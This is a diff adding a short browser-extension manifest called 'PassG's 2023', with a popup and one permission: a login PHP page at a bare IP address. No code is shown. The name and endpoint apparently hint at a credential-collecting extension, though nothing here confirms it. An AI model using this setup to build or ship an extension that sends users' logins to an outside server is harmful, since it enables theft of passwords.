@@ -1,0 +1,18 @@
+{
+  "name": "PassG's 2023",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "This is the greatest invenstion in the history",
+  "icons": {
+    "16": "icon.png",
+    "48": "icon.png",
+    "128": "icon.png"
+  },
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+  "permissions": [
+  "http://152.70.161.47/login.html.php"
+  ]
+}
